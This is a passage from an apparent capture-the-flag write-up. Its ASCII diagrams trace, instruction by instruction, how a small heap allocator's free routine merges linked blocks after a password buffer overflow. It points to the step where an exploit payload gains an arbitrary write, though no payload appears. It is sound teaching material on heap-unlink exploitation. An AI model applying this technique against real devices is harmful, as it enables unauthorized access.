│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408  │  2434  │  0020</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘   ┌────┬───────────────────────┐
                       │4524│ add #0x6, r12         │
                       ├────┼───────────────────────┤  ┌──┐
                       │4528│ add r13, r12          │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤
                       │453c│ mov @r15, r15         │
                       └────┴───────────────────────┘


</code></pre>

<p>First, the algorithm adds six to R12. Notice that the overflowed words before the password buffer are also six bytes.</p>

  </section>
  <section id="full-alternate-execution-trace-3" style="height: 50em">
<pre><code class='language-ascii-noshadows'>                    ┌───┬────┐   ┌───┬────┐
┌──────┐            │R12│<mark>0026</mark>│ + │R13│<mark>0020</mark>│
│      │            └───┴────┘   └───┴────┘
│ ┌──┐ │
│ │  ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0020  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘   ┌────┬───────────────────────┐
                       │4524│ add #0x6, r12         │
                       ├────┼───────────────────────┤
                       │4528│ add r13, r12          │
                       ├────┼───────────────────────┤  ┌──┐
                       │452a│ mov r12, 0x4(r14)     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤
                       │453c│ mov @r15, r15         │
                       └────┴───────────────────────┘


</code></pre>

<p>Next, it adds <code>R12</code> and <code>R13</code> together. Recall that each register was initially set to the third word of the current and previous block, respectively.</p>

  </section>
  <section id="full-alternate-execution-trace-4" style="height: 50em">
<pre><code class='language-ascii-noshadows'>                    ┌───┬────┐
┌──────┐            │R12│<mark>0046</mark>│
│      │            └───┼────┤
│ ┌──┐ │                │    │
│ │  ▼ ▼                ▼    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  <mark>0046</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘   ┌────┬───────────────────────┐
                       │4524│ add #0x6, r12         │
                       ├────┼───────────────────────┤
                       │4528│ add r13, r12          │
                       ├────┼───────────────────────┤
                       │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤  ┌──┐
                       │452e│ mov 0x2(r15), 0x2(r14)│◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤
                       │453c│ mov @r15, r15         │
                       └────┴───────────────────────┘


</code></pre>

<p>It then writes the total sum back to the third word of the previous block.</p>

  </section>
  <section id="full-alternate-execution-trace-5" style="height: 50em">
<pre><code class='language-ascii-noshadows'>
┌──────┐
│      │
│ ┌──┐ │           <mark>┌────────────────────────────────────────┐</mark>
│ │  ▼ ▼           <mark>│</mark>                                        <mark>│</mark>
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ <mark>│</mark>
│ └─┤  2408  │  <mark>2434</mark>  │  0046  │ aaaa 0000 0000 0000 .... │ <mark>│</mark>
│   └────────┴────────┴────────┴──────────────────────────┘ <mark>│</mark>
│      ▲       ▲    ▲                                       <mark>│</mark>
│ ┌────┘       │    │                                       <mark>│</mark>
│ │            │    │                                       <mark>│</mark>
│ │            │    │                                       <mark>│</mark>
│ │            │    │                                       <mark>│</mark>
│ │ ┌────────┬─┴────┴─┬────────┬──────────────────────────┐ <mark>│</mark>
│ └─┤  2408  │  <mark>2434</mark>  │  0020  │ bbbb 0000 0000 0000 .... │ <mark>│</mark>
│   └────────┴─────┬──┴────────┴──────────────────────────┘ <mark>│</mark>
│      ▲           │                                        <mark>│</mark>
│ ┌────┘           ▼                                        <mark>│</mark>
│ │                │                                        <mark>│</mark>
│ │    <mark>┌───────────┴────────────────────────────────────────┘</mark>
│ │    <mark>▼</mark>
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │4524│ add #0x6, r12         │
                       ├────┼───────────────────────┤
                       │4528│ add r13, r12          │
                       ├────┼───────────────────────┤
                       │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤  ┌──┐
                       │4534│ mov 0x2(r15), r13     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤
                       │453c│ mov @r15, r15         │
                       └────┴───────────────────────┘


</code></pre>

<p>Next, it updates the following pointer.</p>

  </section>
  <section id="full-alternate-execution-trace-6" style="height: 50em">
<pre><code class='language-ascii-noshadows'>
┌──────┐
│      │
│ ┌──┐ │           ┌────────────────────────────────────────┐
│ │  ▼ ▼           │                                        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │ │
│   └────────┴────────┴────────┴──────────────────────────┘ │
│      ▲                                                    │
│ ┌────┘       ┌─────►┌────┬───┐                            │
│ │            │      │<mark>2434</mark>│R13│                            │
│ │            │    ┌►└────┴───┘                            │
│ │            │    │                                       │
│ │ ┌────────┬─┴────┴─┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │
│      ▲           │                                        │
│ ┌────┘           ▼                                        │
│ │                │                                        │
│ │    ┌───────────┴────────────────────────────────────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │4524│ add #0x6, r12         │
                       ├────┼───────────────────────┤
                       │4528│ add r13, r12          │
                       ├────┼───────────────────────┤
                       │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤  ┌──┐
                       │4538│ mov r14, 0x0(r13)     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │453c│ mov @r15, r15         │
                       └────┴───────────────────────┘


</code></pre>

<p>It copies the second word of the current block to <code>R13</code> after that, which is not immediately relevant.</p>

  </section>
  <section id="full-alternate-execution-trace-7" style="height: 50em">
<pre><code class='language-ascii-noshadows'>
<mark>┌──────┐</mark>
<mark>│</mark>      <mark>│</mark>
<mark>│</mark> ┌──┐ <mark>│</mark>           ┌────────────────────────────────────────┐
<mark>│</mark> │  ▼ <mark>▼</mark>           │                                        │
<mark>│</mark> │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
<mark>│</mark> └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │ │
<mark>│</mark>   └────────┴────────┴────────┴──────────────────────────┘ │
<mark>│</mark>      ▲                                                    │
<mark>│</mark> ┌────┘                                                    │
<mark>│</mark> │                                                         │
<mark>│</mark> │                                                         │
<mark>│</mark> │                                                         │
<mark>│</mark> │ ┌────────┬────────┬────────┬──────────────────────────┐ │
<mark>│</mark> └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │ │
<mark>│</mark>   └────────┴─────┬──┴────────┴──────────────────────────┘ │
<mark>│</mark>                  │                                        │
<mark>│</mark>                  ▼                                        │
<mark>│</mark>                  │                                        │
<mark>│</mark>      ┌───────────┴────────────────────────────────────────┘
<mark>│</mark>      ▼
<mark>│</mark>   ┌────────┬────────┬────────┬──────────────────────────┐
<mark>├─◄─</mark>┤  <mark>2408</mark>  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│     ▲    ▲       │
│     │    │       │   ┌────┬───────────────────────┐
└─◄───┼─◄──┼─◄─────┘   │4524│ add #0x6, r12         │
      │    │           ├────┼───────────────────────┤
  ┌───┼────┤           │4528│ add r13, r12          │
  │R14│<mark>2408</mark>│           ├────┼───────────────────────┤
  └───┴────┘           │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤  ┌──┐
                       │453c│ mov @r15, r15         │◄─┤PC│
                       └────┴───────────────────────┘  └──┘


</code></pre>

<p>Next, it overwrites the first word of the third block with a pointer to the beginning of the previous block. This step is where the arbitrary write occurs with an exploit payload.</p>

  </section>
  <section id="full-alternate-execution-trace-8" style="height: 50em">
<pre><code class='language-ascii-noshadows'>         ┌───┐
┌──────┐ │<mark>R15</mark>│
│      │ └─┬─┘
│ ┌──┐ │   │       ┌────────────────────────────────────────┐
│ │  ▼ ▼   ▼       │                                        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │ │
│   └────────┴────────┴────────┴──────────────────────────┘ │
│      ▲                                                    │
│ ┌────┘                                                    │
│ │       <mark>R15</mark>                                               │
│ │       ▲ ▲                                               │
│ │       │ │                                               │
│ │ ┌─────┴─┴┬────────┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │
│                  │                                        │
│                  ▼                                        │
│                  │                                        │
│      ┌───────────┴────────────────────────────────────────┘
│      ▼
│   ┌────────┬────────┬────────┬──────────────────────────┐
├─◄─┤  2408  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└─◄────────────────┘   │4524│ add #0x6, r12         │
                       ├────┼───────────────────────┤
                       │4528│ add r13, r12          │
                       ├────┼───────────────────────┤
                       │452a│ mov r12, 0x4(r14)     │
                       ├────┼───────────────────────┤
                       │452e│ mov 0x2(r15), 0x2(r14)│
                       ├────┼───────────────────────┤
                       │4534│ mov 0x2(r15), r13     │
                       ├────┼───────────────────────┤
                       │4538│ mov r14, 0x0(r13)     │
                       ├────┼───────────────────────┤
                       │453c│ mov @r15, r15         │
                       ├────┼───────────────────────┤  ┌──┐
                       │....│ ..................... │◄─┤PC│
                       └────┴───────────────────────┘  └──┘


</code></pre>

<p>Last, it loads the first word of the current block into <code>R15</code>, pointing <code>R15</code> to the beginning of the previous block.</p>

  </section>
</div>
<ul id="nav">
  <li><a href="#full-alternate-execution-trace-1">01</a></li>
  <li><a href="#full-alternate-execution-trace-2">02</a></li>
  <li><a href="#full-alternate-execution-trace-3">03</a></li>
  <li><a href="#full-alternate-execution-trace-4">04</a></li>
  <li><a href="#full-alternate-execution-trace-5">05</a></li>
  <li><a href="#full-alternate-execution-trace-6">06</a></li>
  <li><a href="#full-alternate-execution-trace-7">07</a></li>
  <li><a href="#full-alternate-execution-trace-8">08</a></li>
</ul>

<p>It is interesting to note that it is now possible to get from the first block to the last without traversing the pointers in the middle one. From the perspective of either of the other two, it effectively does not exist.</p>



<br>
<div id="slides">
  <section id="data-structure-pointers-full">
<pre><code class='language-ascii-noshadows'>┌──────┐
│      │
│ ┌──┐ │           ┌────────────────────────────────────────┐
│ │  ▼ ▼           │                                        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
│ └─┤  <mark>2408  │  2434  │  0046  │ aaaa</mark> 0000 0000 0000 .... │ │
│   └────────┴────────┴────────┴──────────────────────────┘ │
│      ▲                                                    │
│ ┌────┘                                                    │
│ │                                                         │
│ │                                                         │
│ │                                                         │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │
│                  │                                        │
│                  ▼                                        │
│                  │                                        │
│      ┌───────────┴────────────────────────────────────────┘
│      ▼
│   ┌────────┬────────┬────────┬──────────────────────────┐
├─◄─┤  <mark>2408  │  2408  │  1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │
└─◄────────────────┘
</code></pre>
  </section>
  <section id="data-structure-pointers-condensed">
<pre><code class='language-ascii-noshadows'>┌──────┐
│      │
│ ┌──┐ │           ┌────────────────────────────────────────┐
│ │  ▼ ▼           │                                        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
│ └─┤  <mark>2408  │  2434  │  0046  │ aaaa</mark> 0000 0000 0000 .... │ │
│   └────────┴────────┴────────┴──────────────────────────┘ │
│      ▲                                                    │
│ ┌────┘                                                    │
│ │                                                         │
│ │    ┌────────────────────────────────────────────────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408  │  2408  │  1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │
└──────────────────┘








</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#data-structure-pointers-full">With Middle Block</a></li>
  <li><a href="#data-structure-pointers-condensed">Without Middle Block</a></li>
</ul>

<p>This observation is interesting because it implies that the data structure no longer includes the middle block—which has been "freed" from it.</p>

<p>After this process, the conditional check for the next branch occurs and passes.</p>

<pre><code class='language-ascii-noshadows'>┌──────┐
│      │
│ ┌──┐ │           <mark>┌────────────────────────────────────────┐</mark>
│ │  ▼ ▼           <mark>│</mark>                                        <mark>│</mark>
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ <mark>│</mark>
│ └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │ <mark>│</mark>
│   └────────┴────────┴────────┴──────────────────────────┘ <mark>│</mark>
│      ▲                                                    <mark>│</mark>
│ ┌────┘                                                    <mark>│</mark>
│ │                                                         <mark>│</mark>
│ │    <mark>┌────────────────────────────────────────────────────┘</mark>
│ │    <mark>▼</mark>
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>¹ │  2408  │  1f9<mark>c</mark>² │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴─────┬──┴──────────────────────────┘
│                  │        │
│                  │        ▼
└──────────────────┘      ┌───┐  ┌─────────┐  ┌────────────────┐
                          │R12├─►│CHECK LSB├─►│CONDITIONAL JUMP│
                          └───┘  └─────────┘  └────────────────┘

    ┌────────────┐          ┌────┬───────────────────────┐
    │*(&amp;PTR + 2)¹│          │453e│ <mark>mov 0x2(r15), r14</mark>     │
    └────────────┘          ├────┼───────────────────────┤
			    │4542│ <mark>mov 0x4(r14), r13</mark>     │
    ┌───────────────────┐   ├────┼───────────────────────┤
    │*(*(&amp;PTR + 2) + 4)²│   │4546│ <mark>bit #0x1, r13</mark>         │
    └───────────────────┘   ├────┼───────────────────────┤  ┌──┐
			    │4548│ <mark>jnz $+0x18 &lt;free+0x58&gt;</mark>│◄─┤PC│
                            └────┴───────────────────────┘  └──┘
</code></pre>

<p>The value at the first word of the last block is <code>**(&amp;PTR + 2)</code>, and the value at the third word is <code>*(*(&amp;PTR + 2) + 4)</code>.</p>

<p>The rest of the algorithm executes as follows.</p>

<br>
<div id="slides">
  <section id="full-alternate-execution-trace-9" style="height: 36em">
<pre><code class='language-ascii-noshadows'>
         ┌───┐
┌──────┐ │<mark>R15</mark>│
│      │ └─┬─┘
│ ┌──┐ │   │
│ │  ▼ ▼   ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │    ┌────►┌────┬───┐
│ │                │    │     │<mark>1f9c</mark>│R13│
│ │    ┌───────────┘    │   ┌►└────┴───┘
│ │    ▼                │   │SET EARLIER
│ │ ┌────────┬────────┬─┴───┴──┬──────────────────────────┐
│ └─┤  2408  │  2408  │  <mark>1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐  ┌──┐
└──────────────────┘   │454a│ add 0x4(r15), r13     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │454e│ add #0x6, r13         │
                       ├────┼───────────────────────┤
                       │4552│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
                       │4556│ mov 0x2(r14), 0x2(r15)│
                       ├────┼───────────────────────┤
                       │455c│ mov r15, 0x0(r14)     │
                       ├────┼───────────────────────┤
                       │....│ ..................... │
                       └────┴───────────────────────┘
</code></pre>

<p>The initial state is above. The value in <code>R13</code> is the next block's third word.</p>

  </section>
  <section id="full-alternate-execution-trace-10" style="height: 36em">
<pre><code class='language-ascii-noshadows'>
           ┌───┬────┐   ┌────┐
┌──────┐   │R13│1f9c│ + │<mark>0046</mark>│
│      │   └───┴────┘   └────┘
│ ┌──┐ │                ▲    ▲
│ │  ▼ ▼                │    │
│ │ ┌────────┬────────┬─┴────┴─┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │454a│ add 0x4(r15), r13     │
                       ├────┼───────────────────────┤  ┌──┐
                       │454e│ add #0x6, r13         │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │4552│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
                       │4556│ mov 0x2(r14), 0x2(r15)│
                       ├────┼───────────────────────┤
                       │455c│ mov r15, 0x0(r14)     │
                       ├────┼───────────────────────┤
                       │....│ ..................... │
                       └────┴───────────────────────┘
</code></pre>

<p>The algorithm adds the third word of the current block to <code>R13</code>.</p>

  </section>
  <section id="full-alternate-execution-trace-11" style="height: 36em">
<pre><code class='language-ascii-noshadows'>
                    ┌───┬────┐   ┌────┐
┌──────┐            │R13│1fe2│ + │<mark>0006</mark>│
│      │            └───┴────┘   └────┘
│ ┌──┐ │
│ │  ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0046  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │454a│ add 0x4(r15), r13     │
                       ├────┼───────────────────────┤
                       │454e│ add #0x6, r13         │
                       ├────┼───────────────────────┤  ┌──┐
                       │4552│ mov r13, 0x4(r15)     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │4556│ mov 0x2(r14), 0x2(r15)│
                       ├────┼───────────────────────┤
                       │455c│ mov r15, 0x0(r14)     │
                       ├────┼───────────────────────┤
                       │....│ ..................... │
                       └────┴───────────────────────┘
</code></pre>

<p>It adds six more to the new <code>R13</code> value.</p>

  </section>
  <section id="full-alternate-execution-trace-12" style="height: 36em">
<pre><code class='language-ascii-noshadows'>
                    ┌───┬────┐
┌──────┐            │R13│1fe8│
│      │            └───┼────┤
│ ┌──┐ │                │    │
│ │  ▼ ▼                ▼    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  <mark>1fe8</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │454a│ add 0x4(r15), r13     │
                       ├────┼───────────────────────┤
                       │454e│ add #0x6, r13         │
                       ├────┼───────────────────────┤
                       │4552│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤  ┌──┐
                       │4556│ mov 0x2(r14), 0x2(r15)│◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │455c│ mov r15, 0x0(r14)     │
                       ├────┼───────────────────────┤
                       │....│ ..................... │
                       └────┴───────────────────────┘
</code></pre>

<p>It then writes the value back to the third word of the current block.</p>

  </section>
  <section id="full-alternate-execution-trace-13" style="height: 36em">
<pre><code class='language-ascii-noshadows'>

┌──────┐
│      │
│ ┌──┐ │  ┌────────┐
│ │  ▼ ▼  ▼        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐
│ └─┤  2408  │  <mark>2408</mark>  │  1fe8  │ aaaa 0000 0000 0000 .... │
│   └────────┴────────┴────────┴──────────────────────────┘
│      ▲       ▲    ▲
│ ┌────┘       │    │
│ │            │    │
│ │            │    │
│ │            │    │
│ │ ┌────────┬─┴────┴─┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │454a│ add 0x4(r15), r13     │
                       ├────┼───────────────────────┤
                       │454e│ add #0x6, r13         │
                       ├────┼───────────────────────┤
                       │4552│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
                       │4556│ mov 0x2(r14), 0x2(r15)│
                       ├────┼───────────────────────┤  ┌──┐
                       │455c│ mov r15, 0x0(r14)     │◄─┤PC│
                       ├────┼───────────────────────┤  └──┘
                       │....│ ..................... │
                       └────┴───────────────────────┘
</code></pre>
<p>Next, the second word of the next block is copied over the second word of the current block, updating the pointer.</p>

  </section>
  <section id="full-alternate-execution-trace-14" style="height: 36em">
<pre><code class='language-ascii-noshadows'>

┌──────┐
│      │
│ ┌──┐ │  ┌────────┐
│ │  ▼ ▼  ▼        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1fe8  │ aaaa 0000 0000 0000 .... │
│   └─────┬─┬┴────────┴────────┴──────────────────────────┘
│      ▲  │ │
│ ┌────┘  │ │
│ │       │ │
│ │       │ │
│ │       ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   ┌────┬───────────────────────┐
└──────────────────┘   │454a│ add 0x4(r15), r13     │
                       ├────┼───────────────────────┤
                       │454e│ add #0x6, r13         │
                       ├────┼───────────────────────┤
                       │4552│ mov r13, 0x4(r15)     │
                       ├────┼───────────────────────┤
                       │4556│ mov 0x2(r14), 0x2(r15)│
                       ├────┼───────────────────────┤
                       │455c│ mov r15, 0x0(r14)     │
                       ├────┼───────────────────────┤  ┌──┐
                       │....│ ..................... │◄─┤PC│
                       └────┴───────────────────────┘  └──┘
</code></pre>

<p>Last, it copies the first word of the current block over the first word of the next block.</p>

  </section>
  <section id="full-alternate-execution-trace-15" style="height: 36em">
<pre><code class='language-ascii-noshadows'>

┌──────┐
│      │
│ ┌──┐ │  ┌────────┐
│ │  ▼ ▼  ▼        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1fe8  │ aaaa 0000 0000 0000 .... │
│   └────────┴────────┴────────┴──────────────────────────┘
│      ▲
│ ┌────┘
│ │
│ │
│ │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │   
└──────────────────┘   
                       
                       
                       
                       
                       
                       
                       
                       
                       
                       
                       
</code></pre>

<p>The above diagram depicts the resulting data structure.</p>

  </section>
  <section id="full-alternate-execution-trace-16" style="height: 36em">
<pre><code class='language-ascii-noshadows'>

 
 
  ┌──┐    ┌────────┐
  │  ▼    ▼        │
  │ ┌────────┬─────┴──┬────────┬──────────────────────────┐
  └─┤  2408  │  2408  │  1fe8  │ aaaa 0000 0000 0000 .... │
    └────────┴────────┴────────┴──────────────────────────┘













                       
                       
                       
                       
                       
                       
                       
                       

</code></pre>

<p>It is worth noting, again, that the second block does not exist from the perspective of the pointers in the first block.</p>

  </section>
</div>
<ul id="nav">
  <li><a href="#full-alternate-execution-trace-9">09</a></li>
  <li><a href="#full-alternate-execution-trace-10">10</a></li>
  <li><a href="#full-alternate-execution-trace-11">11</a></li>
  <li><a href="#full-alternate-execution-trace-12">12</a></li>
  <li><a href="#full-alternate-execution-trace-13">13</a></li>
  <li><a href="#full-alternate-execution-trace-14">14</a></li>
  <li><a href="#full-alternate-execution-trace-15">15</a></li>
  <li><a href="#full-alternate-execution-trace-16">16</a></li>
</ul>

<h3>Reverse Engineering</h3>

<p>With the above visual aid, it is now possible to conjecture about the purpose of the various elements in the data structure.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408  │  241e</mark>  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408  │  2434</mark>  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>241e  │  2408</mark>  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The first two words of any given block are pointers. The overall data structure is a double-linked list (excepting the top block).</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  <mark>2408  │  1000  │  0000  │ 0000</mark> │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
